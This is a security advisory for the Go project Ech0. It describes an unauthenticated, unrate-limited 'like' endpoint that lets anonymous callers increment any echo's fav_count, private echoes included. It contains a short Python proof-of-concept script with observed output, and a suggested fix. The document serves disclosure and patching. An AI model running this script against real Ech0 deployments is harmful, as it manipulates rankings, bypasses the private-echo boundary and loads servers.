# [M] Ech0 allows PUT /api/echo/like/:id unauthenticated: anonymous callers to modify any echo's fav_count

## Summary
Severity: Medium
Advisory: GHSA-pj6q-4vq4-r8cg
CWE: CWE-770, CWE-862
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-pj6q-4vq4-r8cg
Type: github-advisory

## Affected
- Go: `github.com/lin-snow/Ech0` — affected >=0 <1.4.8-0.20260503035905-cecc2c19b590

## Details
## Summary

`PUT /api/echo/like/:id` at `internal/router/echo.go:12` is registered on `PublicRouterGroup` with no authentication and no rate limit. Anonymous callers increment the `fav_count` counter on any echo (including private echoes) by UUID, repeat the request without deduplication, and trigger a database write plus a four-key cache invalidation on every call. Alice harvests echo UUIDs from the public `GET /api/echo/page` response, inflates fav counts at will, and spams writes to amplify load on the DB and cache layers.

## Details

Route registration at `internal/router/echo.go:12`:

```go
appRouterGroup.PublicRouterGroup.PUT("/echo/like/:id", h.EchoHandler.LikeEcho())
```

`PublicRouterGroup` is `r.Group("/api")` without the JWT middleware that `AuthRouterGroup` applies. The handler passes through to `EchoService.LikeEcho`, which calls `EchoRepository.LikeEcho` at `internal/repository/echo/echo.go:270`:

```go
func (echoRepository *EchoRepository) LikeEcho(ctx context.Context, id string) error {
    var exists bool
    if err := echoRepository.getDB(ctx).Model(&model.Echo{}).
        Select("count(*) > 0").Where("id = ?", id).Find(&exists).Error; err != nil {
        return err
    }
    if !exists {
        return errors.New(commonModel.ECHO_NOT_FOUND)
    }
    if err := echoRepository.getDB(ctx).Model(&model.Echo{}).
        Where("id = ?", id).
        UpdateColumn("fav_count", gorm.Expr("fav_count + ?", 1)).Error; err != nil {
        return err
    }
    return nil
}
```

No viewer check, no ownership check, no private-flag check. Compare the read path at `EchoService.GetEchoById` (`internal/service/echo/echo.go:275-300`) which rejects anonymous readers on private echoes; the like path skips that gate. `InvalidateEchoCaches` (`internal/repository/echo/echo.go:51-58`) clears the page cache, today cache, RSS cache, and per-echo cache on every like. Comment creation on the same router group runs behind `checkRateLimit` (`internal/service/comment/comment.go:731-766`, 3 per 60 s per IP plus 20 per 3600 s); the like endpoint has no such middleware.

## Proof of Concept

Default install, anonymous caller on the network:

```python
import requests
TARGET = "http://localhost:8300"

# 1) Discover an echo UUID from the public feed (no auth).
page = requests.get(f"{TARGET}/api/echo/page?page=1&pageSize=1").json()
echo_id = page["data"]["items"][0]["id"]

# 2) Like it. Repeat without deduplication.
for i in range(3):
    r = requests.put(f"{TARGET}/api/echo/like/{echo_id}")
    print(f"public like #{i+1}: HTTP {r.status_code} {r.text}")

# 3) Like a private echo by UUID. Private echoes never appear in /api/echo/page,
#    but the UUID arrives via other channels (logs, referer, shared drafts).
private_id = "019daf77-4a97-7c4c-a63c-791b10ecfd0b"  # admin-created private echo
r = requests.put(f"{TARGET}/api/echo/like/{private_id}")
print(f"private like: HTTP {r.status_code} {r.text}")
```

Observed on v4.5.6 in the test container:

```
public like #1: HTTP 200 {"code":1,"msg":"点赞Echo成功","data":null}
public like #2: HTTP 200 {"code":1,"msg":"点赞Echo成功","data":null}
public like #3: HTTP 200 {"code":1,"msg":"点赞Echo成功","data":null}
private like: HTTP 200 {"code":1,"msg":"点赞Echo成功","data":null}
```

The same IP likes the same echo three times without 429 or dedup. The private-echo like (UUID `019daf77-4a97...`) succeeded even though `GetEchosById` would refuse to read that echo for an anonymous caller.

## Impact

Anonymous, rate-limit-free writes against any echo's `fav_count`. Direct impact:

- **Popularity signal destruction.** fav_count powers the `hot` feed; a single script skews the ranking at will.
- **Private-boundary bypass.** Private-flagged echoes remain non-readable, but they accept likes from anyone who knows the UUID. UUIDs leak through logs, referer headers on shared drafts, and the owner's browser history.
- **Server and cache load.** Every call triggers a SQLite `UPDATE` transaction plus four cache-key invalidations. A single attacker from one IP drives sustained writes and forces cache stampedes for every concurrent reader.

Reachability is anonymous. No credentials, no tokens, no session. Every Ech0 deployment that exposes port 6277 is reachable.

## Recommended Fix

Move the route to `AuthRouterGroup` so JWT middleware applies, add a per-user dedup gate, and rate-limit at the middleware layer:

```go
appRouterGroup.AuthRouterGroup.PUT(
    "/echo/like/:id",
    middleware.RateLimit(5, 10),
    h.EchoHandler.LikeEcho(),
)
```

At the service layer, check the private flag and record the user/echo pair in a join table to prevent repeat increments from the same user:

```go
func (s *EchoService) LikeEcho(ctx context.Context, id string) error {
    userID := viewer.MustFromContext(ctx).UserID()
    if userID == "" {
        return errors.New(commonModel.NO_PERMISSION_DENIED)
    }
    echo, err := s.echoRepository.GetEchosById(ctx, id)
    if err != nil || echo == nil {
        return errors.New(commonModel.ECHO_NOT_FOUND)
    }
    if echo.Private {
        user, err := s.commonService.CommonGetUserByUserId(ctx, userID)
        if err != nil || !user.IsAdmin {
            return errors.New(commonModel.NO_PERMISSION_DENIED)
        }
    }
    return s.echoRepository.LikeEchoOnce(ctx, id, userID)
}
```

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/lin-snow/Ech0/security/advisories/GHSA-pj6q-4vq4-r8cg
- https://github.com/lin-snow/Ech0/commit/cecc2c19b590df85d79ea98457faa143130cd620
- https://github.com/lin-snow/Ech0
